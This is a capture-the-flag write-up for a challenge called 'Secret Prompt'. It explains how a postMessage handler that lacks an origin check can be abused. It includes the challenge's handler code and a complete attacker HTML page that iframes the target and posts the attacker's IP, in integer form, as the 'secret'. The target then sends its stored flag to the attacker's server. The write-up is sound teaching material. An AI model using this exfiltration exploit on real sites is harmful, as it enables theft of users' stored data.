# Secret Prompt

## Solution

The page uses `postMessage` to interact with its Javascript:

- `postMessage({ secret: a.value, prompt: b.value })` to send a message
- `onmessage = (e) => { ... }` to listen for posted messages

[postMessage](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage) and [onmessage](https://developer.mozilla.org/en-US/docs/Web/API/Window/message_event) are methods on the `window` object so `postMessage` could be also writtern as `window.postMessage`.

A common issue when `postMessage` is used is when the receiver of the message does not check the origin of the message to confirm it's coming from a trusted page.

This can be abused by a malicious page that embeds the vulnerable page in an iframe. The parent window can send messages to its child iframes.

To get the flag we can:

1. Host our own page that embeds the challenge's page
2. Add JavaScript in our page that sends a `postMessage` to the challenge's child iframe with a message we control
3. Get the flag

Now let's figure out what that message should be.

```javascript
onmessage = (e) => {
  const secret = parseInt(e.data.secret);
  const prompt = e.data.prompt;
  // let's go
  if (!Number.isSafeInteger(secret)) {
    return (error.innerText = "Bad Secret :(");
  }
  // be positive
  if (secret <= 0) {
    return (error.innerText = "Bad Secret :(");
  }
  // i don't like odds
  if (secret % 2 !== 0) {
    return (error.innerText = "Bad Secret :(");
  }
  // build a function
  ((_, ...s) => fetch(`//${s[1]}?p=${s[2]}&k=${s[0]}`))// secret instructions
  `I'll give you a ${localStorage["gift"]} if you know the ${secret} ${prompt}! 🎁`;
  // good luck & goodbye
};
```

The first three `if`s just ensure that `secret` is a positive, even, integer number.

The last two(?) lines of code essentially send a fetch request to `${secret}` and adds `${prompt}` and `${localStorage["gift"]}` in the URL parameters.

So the tricks here to understand this JavaScript code is:

1. Understand [Self-Executing Anonynomous Functions](https://developer.mozilla.org/en-US/docs/Glossary/IIFE)
2. Understand [Tagged Templates](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Template_literals#tagged_templates) (essentially calling a function using backticks instead of parentheses)
3. Know you can send an HTTP request to an IP address in its integer representation (inspired by https://twitter.com/h43z/status/1618220318023364608)
4. Also you should notice that with the absence of semicolons, the last 2 lines are essentially one single statement: `` ((...)=>{...})`...` ``

Putting this altogether:

You can host a page that looks like this:

```html
<!-- index.html -->
<!DOCTYPE html>
<html>
<iframe id="i" src="http://challenges.cybermouflons.com:xxxxx" width="800" height="800"></iframe>
<script>
    const ip2int = (ip) => ip.split('.').reduce((ipInt, octet) => (ipInt << 8) + parseInt(octet, 10), 0) >>> 0;
    const MY_IP = 'xxx.xxx.xxx.xxx';
    <!-- assert ip2int(MY_IP) % 2 === 0 -->
    setTimeout(() => i.contentWindow.postMessage({ secret: ip2int(MY_IP), prompt: 'nothing' }, '*'), 1000);
</script>
</html>
```

At the same time we have a web server listening on an "even" IP address where we should receive a GET request with the flag in the URL parameters.
